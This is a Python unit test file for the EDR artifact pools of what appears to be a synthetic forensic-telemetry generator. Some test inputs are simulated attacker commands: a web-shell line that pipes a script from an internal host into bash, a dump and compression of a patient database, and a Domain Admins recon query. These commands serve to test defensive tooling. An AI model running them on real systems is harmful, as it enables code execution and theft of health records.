# Copyright (c) 2026 Cisco Systems, Inc. and its affiliates
# SPDX-License-Identifier: MIT

"""Unit tests for EDR pools YAML loader."""

import random

from evidenceforge.generation.activity.edr_pools import (
    _sanitize_edr_pools,
    defender_platform_version,
    get_dll_pool,
    get_file_paths,
    get_registry_keys_hkcu,
    get_registry_keys_hklm,
    load_edr_pools,
    materialize_edr_template,
    materialize_edr_template_group,
    normalize_defender_platform_path,
    select_file_side_effect,
)


class TestLoadEdrPools:
    """Test that the YAML loads correctly with all sections."""

    def test_all_sections_present(self):
        pools = load_edr_pools()
        assert "file_paths_windows" in pools
        assert "file_paths_linux" in pools
        assert "registry_keys_hkcu" in pools
        assert "registry_keys_hklm" in pools
        assert "dll_pool" in pools

    def test_all_sections_non_empty(self):
        pools = load_edr_pools()
        for key in [
            "file_paths_windows",
            "file_paths_linux",
            "registry_keys_hkcu",
            "registry_keys_hklm",
            "dll_pool",
            "file_side_effect_profiles",
        ]:
            assert len(pools[key]) > 0, f"{key} is empty"

    def test_read_only_recon_tool_has_no_file_side_effect(self):
        import random

        effect = select_file_side_effect(
            process_name=r"C:\Windows\System32\dsquery.exe",
            command_line='dsquery.exe group -name "Domain Admins"',
            os_category="windows",
            rng=random.Random(5),
            user="alice",
        )

        assert effect is None

    def test_browser_side_effect_uses_browser_cache_profile(self):
        import random

        effect = select_file_side_effect(
            process_name=r"C:\Program Files\Google\Chrome\Application\chrome.exe",
            command_line="chrome.exe --type=renderer",
            os_category="windows",
            rng=random.Random(5),
            user="alice",
        )

        assert effect is not None
        action, path = effect
        assert action in {"create", "modify"}
        assert "cache" in path.lower()
        assert "Security.evtx" not in path

    def test_browser_side_effect_matches_executable_family(self):
        import random

        cases = [
            (
                r"C:\Program Files\Google\Chrome\Application\chrome.exe",
                "chrome.exe --type=renderer",
                r"google\chrome",
            ),
            (
                r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
                "msedge.exe --type=renderer",
                r"microsoft\edge",
            ),
            (
                r"C:\Program Files\Mozilla Firefox\firefox.exe",
                "firefox.exe -contentproc",
                r"mozilla\firefox",
            ),
        ]

        for process_name, command_line, expected_path_fragment in cases:
            effect = select_file_side_effect(
                process_name=process_name,
                command_line=command_line,
                os_category="windows",
                rng=random.Random(5),
                user="alice",
            )

            assert effect is not None
            _action, path = effect
            assert expected_path_fragment in path.lower()


class TestFilePaths:
    """Test file path pool content."""

    def test_windows_has_templates(self):
        paths = get_file_paths("windows")
        assert any("{user}" in p for p in paths), "No {user} template in Windows paths"
        assert any("{rand}" in p for p in paths), "No {rand} template in Windows paths"

    def test_linux_has_templates(self):
        paths = get_file_paths("linux")
        assert any("{user}" in p for p in paths), "No {user} template in Linux paths"
        assert any("/home/" in p for p in paths), "No /home/ paths in Linux pool"

    def test_windows_paths_have_backslashes(self):
        paths = get_file_paths("windows")
        assert all("\\" in p for p in paths), "Windows paths should use backslashes"

    def test_linux_paths_have_forward_slashes(self):
        paths = get_file_paths("linux")
        assert all("/" in p for p in paths), "Linux paths should use forward slashes"


class TestRegistryKeys:
    """Test registry key pool content."""

    def test_hkcu_returns_3tuples(self):
        keys = get_registry_keys_hkcu()
        assert len(keys) >= 5
        for k, vname, details in keys:
            assert k.startswith("HKCU\\"), f"HKCU key doesn't start with HKCU\\: {k}"
            assert "\\" in k, f"Key missing backslash: {k}"
            assert vname, f"Value name is empty for key {k}"
            assert details, f"Details is empty for key {k}"

    def test_hklm_returns_3tuples(self):
        keys = get_registry_keys_hklm()
        assert len(keys) >= 4
        for k, vname, _details in keys:
            assert k.startswith("HKLM\\"), f"HKLM key doesn't start with HKLM\\: {k}"
            assert vname, f"Value name is empty for key {k}"

    def test_registry_details_are_realistic(self):
        """Details should be DWORD values or strings, not value names."""
        for _k, _vn, details in get_registry_keys_hklm():
            assert details.startswith("DWORD (") or not details.isupper(), (
                f"Details looks like a value name, not data: {details}"
            )

    def test_hklm_pool_excludes_host_role_specific_service_config(self):
        """Host-wide noise should not emit role-specific service/app config everywhere."""
        keys = get_registry_keys_hklm()
        rendered = [f"{key}\\{value_name}" for key, value_name, _details in keys]

        assert not any(r"Services\DNS\Parameters\ListenAddresses" in key for key in rendered)
        assert not any(r"App Paths\WinSCP.exe" in key for key in rendered)
        assert not any("WDigest" in key for key in rendered)


class TestDllPool:
    """Test DLL path pool content."""

    def test_contains_system32_and_application_dlls(self):
        dlls = get_dll_pool()
        assert len(dlls) >= 5
        assert any("System32" in d for d in dlls)
        assert any("Program Files" in d for d in dlls)

    def test_contains_common_dlls(self):
        dlls = get_dll_pool()
        dll_names = [d.rsplit("\\", 1)[-1].lower() for d in dlls]
        assert "ntdll.dll" in dll_names
        assert "kernel32.dll" in dll_names


class TestTemplateMaterialization:
    """Test EDR template placeholder expansion."""

    def test_materializes_registry_and_dll_placeholders(self):
        import random

        rng = random.Random(7)
        value = materialize_edr_template(
            r"HKCU\Software\Test\{guid}\Document {doc}\{hex}\{user}",
            rng,
            "alice",
        )

        assert "{guid}" not in value
        assert "{doc}" not in value
        assert "{hex}" not in value
        assert value.endswith(r"\alice")

    def test_materializes_guid_with_single_registry_braces(self):
        import random

        rng = random.Random(9)
        value = materialize_edr_template(r"Interfaces\{{{guid}}}\DhcpIPAddress", rng)

        assert "{{" not in value
        assert "}}" not in value
        assert value.startswith(r"Interfaces\{")
        assert value.endswith(r"}\DhcpIPAddress")

    def test_materializes_host_ip_context(self):
        import random

        value = materialize_edr_template("{host_ip}", random.Random(9), host_ip="10.10.2.20")

        assert value == "10.10.2.20"

    def test_materializes_interface_guid_stably_per_host_ip(self):
        import random

        template = r"HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{{{guid}}}"
        first = materialize_edr_template(
            template,
            random.Random(1),
            host_ip="10.10.2.20",
            host_key="FILE-SRV-01",
        )
        second = materialize_edr_template(
            template,
            random.Random(999),
            host_ip="10.10.2.20",
            host_key="FILE-SRV-01",
        )
        other = materialize_edr_template(
            template,
            random.Random(1),
            host_ip="10.10.2.10",
            host_key="DC-01",
        )

        assert first == second
        assert first != other

    def test_materializes_group_interface_guid_stably_per_host_ip(self):
        import random

        templates = (
            r"HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{{{guid}}}",
            "DhcpIPAddress",
            "{host_ip}",
        )
        first = materialize_edr_template_group(
            templates,
            random.Random(1),
            host_ip="10.10.2.20",
            host_key="FILE-SRV-01",
        )
        second = materialize_edr_template_group(
            templates,
            random.Random(999),
            host_ip="10.10.2.20",
            host_key="FILE-SRV-01",
        )
        other = materialize_edr_template_group(
            templates,
            random.Random(1),
            host_ip="10.10.2.10",
            host_key="DC-01",
        )

        assert first == second
        assert first != other
        assert first[2] == "10.10.2.20"

    def test_materializes_defender_platform_with_product_version_shape(self):
        import random

        value = materialize_edr_template(
            r"C:\ProgramData\Microsoft\Windows Defender\Platform\{version}\MpClient.dll",
            random.Random(9),
            host_key="WS-01",
        )

        assert rf"\Platform\{defender_platform_version('WS-01')}\MpClient.dll" in value
        assert "\\125.0\\" not in value
        assert "\\2024.3\\" not in value

    def test_normalizes_defender_platform_version_per_host(self):
        version = defender_platform_version("WS-01")

        assert (
            normalize_defender_platform_path(
                r"C:\ProgramData\Microsoft\Windows Defender\Platform\MpClient.dll",
                "WS-01",
            )
            == rf"C:\ProgramData\Microsoft\Windows Defender\Platform\{version}\MpClient.dll"
        )
        assert (
            normalize_defender_platform_path(
                r"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2301.6-0\MpClient.dll",
                "WS-01",
            )
            == rf"C:\ProgramData\Microsoft\Windows Defender\Platform\{version}\MpClient.dll"
        )

    def test_materializes_related_templates_with_shared_placeholders(self):
        import random

        key, details = materialize_edr_template_group(
            (
                r"HKLM\Software\Microsoft\Windows\CurrentVersion\App Paths\app-{doc}.exe",
                r"C:\Program Files\Common Files\Vendor\app-{doc}.exe",
            ),
            random.Random(11),
        )

        key_doc = key.rsplit("app-", 1)[1].split(".exe", 1)[0]
        details_doc = details.rsplit("app-", 1)[1].split(".exe", 1)[0]
        assert key_doc == details_doc


class TestFileSideEffectRealism:
    def test_default_side_effect_pools_do_not_leak_generator_names(self):
        data = load_edr_pools()
        haystack = str(data)
        assert "eforge-" not in haystack
        assert "artifact-" not in haystack

    def test_gzip_side_effect_uses_compressed_operand_path(self):
        effect = select_file_side_effect(
            "gzip",
            "gzip -9 /tmp/patient_claims.sql",
            "linux",
            random.Random(7),
            user="root",
        )

        assert effect == ("create", "/tmp/patient_claims.sql.gz")

    def test_mysqldump_side_effect_uses_redirect_path(self):
        effect = select_file_side_effect(
            "mysqldump",
            "mysqldump ehr patients > /tmp/patient_claims.sql",
            "linux",
            random.Random(7),
            user="root",
        )

        assert effect == ("create", "/tmp/patient_claims.sql")

    def test_noninteractive_web_shell_does_not_write_bash_history_artifact(self):
        effects = {
            select_file_side_effect(
                "bash",
                "bash -c 'curl http://10.0.0.5/s.sh | bash'",
                "linux",
                random.Random(seed),
                user="apache",
            )
            for seed in range(20)
        }

        assert all(effect is None or not effect[1].endswith("/.bash_history") for effect in effects)


class TestOverlayValidation:
    """Test fallback behavior for malformed overlay-provided pools."""

    def test_sanitize_empty_string_pools_falls_back_to_defaults(self):
        defaults = {
            "file_paths_windows": [r"C:\\Windows\\Temp\\x.tmp"],
            "file_paths_linux": ["/tmp/x.tmp"],
            "dll_pool": [r"C:\\Windows\\System32\\kernel32.dll"],
            "registry_keys_hkcu": [["HKCU\\Software\\X", "Enabled", "DWORD (0x00000001)"]],
            "registry_keys_hklm": [["HKLM\\Software\\X", "Enabled", "DWORD (0x00000001)"]],
        }
        merged = {**defaults, "file_paths_windows": [], "dll_pool": []}

        sanitized = _sanitize_edr_pools(defaults, merged)

        assert sanitized["file_paths_windows"] == defaults["file_paths_windows"]
        assert sanitized["dll_pool"] == defaults["dll_pool"]

    def test_sanitize_malformed_registry_pool_falls_back_to_defaults(self):
        defaults = {
            "file_paths_windows": [r"C:\\Windows\\Temp\\x.tmp"],
            "file_paths_linux": ["/tmp/x.tmp"],
            "dll_pool": [r"C:\\Windows\\System32\\kernel32.dll"],
            "registry_keys_hkcu": [["HKCU\\Software\\X", "Enabled", "DWORD (0x00000001)"]],
            "registry_keys_hklm": [["HKLM\\Software\\X", "Enabled", "DWORD (0x00000001)"]],
        }
        merged = {**defaults, "registry_keys_hkcu": {"bad": "shape"}}

        sanitized = _sanitize_edr_pools(defaults, merged)

        assert sanitized["registry_keys_hkcu"] == defaults["registry_keys_hkcu"]
